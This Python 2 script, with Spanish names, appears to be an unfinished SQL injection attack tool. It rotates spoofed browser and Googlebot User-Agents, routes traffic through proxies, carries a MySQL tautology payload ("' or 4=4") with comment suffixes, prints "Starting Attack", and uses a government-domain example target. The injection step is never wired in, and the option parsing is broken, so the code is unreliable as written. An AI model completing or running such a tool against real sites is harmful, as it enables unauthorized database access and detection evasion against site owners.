#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit
from random import choice
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
import socks
class Injection:
	Agentes={
	'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
	'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
	'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
	'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
	'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
	'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}
	cabeceras={}
	proxy={}
	cookies = {}
	datos={}
	method = -1 # True = Get method # False = Post method
	server=""
	sufijos = ['#','/*','//','-- a',';']
	Intentos={
		'mysql':[r"' or 4=4"]
	}
	SentHeaders = ""
	respuesta = ""

	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		#self.cookie.update({""})
		print galleta

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = self.proxy = {"http":proxy}

	def Begin(self):
		#print self.server, self.cabeceras
		print "Starting Attack\n\n\n"
		sleep(1)
		if self.method:#GET
			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
		else:#POST
			pagina = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos,proxies=self.proxy)
		self.SentHeaders = pagina.request.headers
		self.solicitud = pagina.request.headers
		self.respuesta = pagina.content.lower()
		print "{0} {1} {2}".format(pagina.request.method,pagina.request.path_url,"HTTP/1.1")
		for cabecera in self.solicitud:
			print "{0}:{1}".format(cabecera,self.solicitud.get(cabecera))
#		print self.solicitud
		print pagina.text


def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["request=","user-agent=","method=","random-agent=","data=","proxy="])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookie'):
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random NO FUNCIONA AUN
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--proxy':
			inject.setProxy(vals)
		#Option not valid
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
		else:
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()

def main():
	inject.Begin()
	# Response = str(requests.get(server,headers=cabeceras).text).lower()
	# posIni = Response.find('post')
	# posFin = Response.find('</form>',posIni)
	# parametros = Response[posIni:posFin]
	# datos = parametros[parametros.find('<table'):] 
	# print datos
if __name__ == "__main__":
	inject = Injection()
	Opciones(argv)
	#main()
